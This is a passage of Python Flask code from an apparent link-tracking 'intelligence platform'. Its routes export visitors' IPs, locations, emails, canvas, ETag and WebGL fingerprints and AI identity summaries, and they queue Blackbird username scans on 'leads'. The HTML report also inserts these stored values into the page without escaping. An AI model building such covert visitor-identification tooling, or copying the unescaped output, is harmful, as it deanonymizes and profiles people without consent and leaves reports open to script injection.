        'ID', 'Timestamp', 'IP', 'Hostname', 'ISP', 'Org', 'City', 'Country',
        'Lat', 'Lon', 'OS', 'Device', 'Email', 'Canvas Hash', 'ETag',
        'WebGL', 'AI Summary', 'CPU Cores', 'RAM GB', 'Suspicious', 'Referrer'
    ])
    
    for v in visits:
        cw.writerow([
            v.id, v.timestamp, v.ip_address, v.hostname or '', v.isp or '', v.org or '',
            v.city or '', v.country or '', v.lat or '', v.lon or '',
            v.os_family or '', v.device_type or '', v.email or '',
            v.canvas_hash or '', v.etag or '', v.webgl_renderer or '',
            v.ai_summary or '', v.cpu_cores or '', v.ram_gb or '',
            'Yes' if v.is_suspicious else 'No', v.referrer or ''
        ])
    
    output = make_response(si.getvalue())
    output.headers['Content-Disposition'] = f'attachment; filename={slug}_export.csv'
    output.headers['Content-Type'] = 'text/csv'
    return output

@bp.route('/export/<slug>/pdf')
@login_required
def export_pdf(slug):
    """Export link stats as PDF (HTML-based, print-ready)."""
    link = Link.query.filter_by(slug=slug).first_or_404()
    visits = Visit.query.filter_by(link_id=link.id).order_by(Visit.timestamp.desc()).limit(50).all()
    
    # Generate HTML report
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Report: /{slug}</title>
        <style>
            body {{ font-family: Arial, sans-serif; padding: 20px; }}
            h1 {{ color: #333; }}
            table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
            th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; font-size: 11px; }}
            th {{ background: #333; color: white; }}
            tr:nth-child(even) {{ background: #f9f9f9; }}
            .meta {{ color: #666; margin-bottom: 20px; }}
        </style>
    </head>
    <body>
        <h1>Intelligence Report: /{slug}</h1>
        <div class="meta">
            <p>Destination: {link.destination}</p>
            <p>Total Visits: {len(visits)}</p>
            <p>Generated: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}</p>
        </div>
        <table>
            <thead>
                <tr>
                    <th>Time</th>
                    <th>IP / Hostname</th>
                    <th>Location</th>
                    <th>Device</th>
                    <th>Identity</th>
                </tr>
            </thead>
            <tbody>
    '''
    
    for v in visits:
        identity = v.email or v.ai_summary or '-'
        html += f'''
            <tr>
                <td>{v.timestamp.strftime('%Y-%m-%d %H:%M')}</td>
                <td>{v.ip_address}<br><small>{v.hostname or v.org or ''}</small></td>
                <td>{v.city or ''}, {v.country or ''}</td>
                <td>{v.os_family or ''} / {v.device_type or ''}</td>
                <td>{identity}</td>
            </tr>
        '''
    
    html += '''
            </tbody>
        </table>
        <p style="margin-top:20px; font-size:10px; color:#999;">
            Generated by ulrTrack Intelligence Platform
        </p>
    </body>
    </html>
    '''
    
    response = make_response(html)
    response.headers['Content-Type'] = 'text/html'
    response.headers['Content-Disposition'] = f'attachment; filename={slug}_report.html'
    return response


# V41: Custom AI Analysis
@bp.route('/lead/<int:lead_id>/ai_custom', methods=['POST'])
@login_required
def ai_custom(lead_id):
    lead = Lead.query.get_or_404(lead_id)
    prompt = request.form.get('prompt')
    
    if prompt:
        try:
            result = ai.generate(prompt)
            
            # Save to AI Identity field to display in Profile
            import json
            cf = json.loads(lead.custom_fields or '{}')
            cf['ai_identity'] = result
            lead.custom_fields = json.dumps(cf)
            db.session.commit()
            
            flash("Custom AI Analysis Executed.", "success")
        except Exception as e:
            flash(f"AI Error: {str(e)}", "error")
            
    return redirect(url_for('dashboard.contacts'))


# V43: Trigger Blackbird Scan
@bp.route('/lead/<int:lead_id>/blackbird', methods=['POST'])
@login_required
def trigger_blackbird(lead_id):
    lead = Lead.query.get_or_404(lead_id)
    log_queue.put({'type': 'blackbird', 'lead_id': lead.id})
    flash(f"Blackbird Scan Queued for {lead.email.split('@')[0]}", "success")
    return redirect(url_for('dashboard.contacts'))

